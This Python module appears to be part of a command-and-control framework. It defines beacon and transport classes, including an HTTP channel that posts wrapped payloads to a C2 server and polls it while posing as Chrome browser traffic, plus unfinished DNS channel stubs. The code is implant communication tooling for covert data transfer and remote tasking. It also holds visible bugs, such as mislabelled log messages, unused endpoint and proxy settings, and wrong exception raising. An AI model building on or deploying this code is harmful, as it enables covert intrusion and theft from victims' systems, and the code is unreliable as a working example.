from dataclasses import dataclass
from abc import ABC
import re
import requests
import base64
import os

from helpers import debug, unwrap_dict, verbose, wrap_dict


@dataclass
class Beacon(ABC):
    def beacon(self, payload):
        ...


class HTTPBeacon(Beacon):
    server: str
    endpoint: str

    def beacon(self, payload: bytes):
        verbose(f"beaconing via dns to {self.server}{self.endpoint}")


class DNSBeacon(Beacon):
    server: str

    def beacon(self, payload: bytes):
        verbose(f"beaconing via dns to {self.server}")


@dataclass
class Transport(ABC):
    """C2 transport base class"""

    def send(self, payload: bytes):
        ...

    def recv(self, payload: bytes):
        ...


@dataclass
class HTTPTransport(Transport):
    """Class for http/s based c2 channel
    Meant for burnable short-haul comms or bandwidth-heavy activity
    """

    server: str
    proxies: tuple = tuple()
    endpoint: str = "/"
    send_method: str = "post"
    recv_method: str = "get"
    good_status_code = "200"
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"

    # Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
    # https://www.whatismybrowser.com/guides/the-latest-user-agent/

    def send(self, data: bytes, **kwargs):
        verbose(f"sending {data} via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}

        payload_dict = {"asdf": "asdf", "payload": data}

        payload = wrap_dict(payload_dict)

        return requests.post(
            self.server,
            headers=headers,
            proxies=kwargs.get("proxies", []),
            data=payload,
        )

    def recv(self) -> dict:
        verbose(f"recieving via http transport on {self.server}{self.endpoint}")
        headers = {"User-Agent": self.user_agent}
        try:
            resp = requests.get(self.server, headers=headers)

            verbose(f'got wrapped "{resp.text}"')
            data = unwrap_dict(resp.text)
            verbose("unwrapped", data)

            return data
        except requests.exceptions.ConnectionError as e:
            verbose(e)
        except BaseException as e:
            debug(e)


@dataclass
class DNSTransport(Transport):
    """Class for dns based c2 channel"""

    domain: str
    tx_record_type: str = "A"
    rx_record_type: str = "A"

    def send(self, payload: bytes):
        verbose(
            f"sending {payload} via DNS {self.tx_record_type} record on {self.domain}"
        )
        raise NotImplemented

    def recv(self) -> dict:
        verbose(f"recieving via DNS {self.tx_record_type} record on {self.domain}")
        raise NotImplemented
